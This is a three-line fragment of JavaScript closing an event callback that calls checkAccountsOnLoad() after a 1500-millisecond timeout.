        checkAccountsOnLoad();
    }, 1500);
});